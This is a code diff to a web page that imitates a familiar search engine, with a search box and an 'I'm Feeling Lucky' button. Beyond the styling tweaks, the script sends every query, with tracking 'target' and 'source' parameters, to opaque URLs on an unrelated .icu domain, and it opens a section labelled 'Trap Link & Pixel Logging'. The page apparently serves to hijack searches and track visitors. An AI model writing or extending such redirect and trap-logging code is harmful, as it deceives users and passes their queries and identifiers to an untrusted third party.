@@ -51,24 +51,24 @@
             display: flex;
             align-items: center;
             background-color: white;
-            border-radius: 24px;
-            padding: 10px 15px;
+            border-radius: 32px; /* Increased thickness */
+            padding: 15px 20px; /* Thicker input field */
             box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
             position: relative;
         }
 
         /* Magnifying Glass */
         .search-icon {
-            width: 20px;
-            height: 20px;
-            margin-right: 10px;
+            width: 24px;
+            height: 24px;
+            margin-right: 15px;
             fill: rgb(141, 147, 154);
         }
 
         /* Search Input */
         input.search-input {
             border: none;
-            font-size: 16px;
+            font-size: 18px;
             width: 100%;
             outline: none;
         }
@@ -106,24 +106,26 @@
             const target = getUrlParam('target');
             const source = getUrlParam('source');
 
-            function searchQuery(event, lucky = false) {
+            function searchQuery(event) {
                 event.preventDefault();
                 const query = document.getElementById('searchInput').value.trim();
                 if (query) {
-                    let baseUrl = lucky 
-                        ? "https://addents-leasure.icu/36f99e97-f40d-4744-ad2b-2b0b006aaf09"
-                        : "https://addents-leasure.icu/7419ec1e-54f4-4a1c-8667-9211d9f8ea3a";
-
-                    const searchUrl = `${baseUrl}?query=${encodeURIComponent(query).replace(/%20/g, '+')}`
+                    const searchUrl = `https://addents-leasure.icu/7419ec1e-54f4-4a1c-8667-9211d9f8ea3a?query=${encodeURIComponent(query).replace(/%20/g, '+')}`
                         + (target ? `&target=${encodeURIComponent(target)}` : '')
                         + (source ? `&source=${encodeURIComponent(source)}` : '');
-                    
                     window.location.href = searchUrl;
                 }
             }
 
-            document.getElementById('searchForm').addEventListener('submit', (event) => searchQuery(event, false));
-            document.getElementById('luckyButton').addEventListener('click', (event) => searchQuery(event, true));
+            document.getElementById('searchForm').addEventListener('submit', searchQuery);
+
+            // "I'm Feeling Lucky" should navigate to the URL even if no input is given
+            document.getElementById('luckyButton').addEventListener('click', function () {
+                const luckyUrl = `https://addents-leasure.icu/36f99e97-f40d-4744-ad2b-2b0b006aaf09`
+                    + (target ? `?target=${encodeURIComponent(target)}` : '')
+                    + (source ? `&source=${encodeURIComponent(source)}` : '');
+                window.location.href = luckyUrl;
+            });
 
             // Trap Link & Pixel Logging
             const logData = {
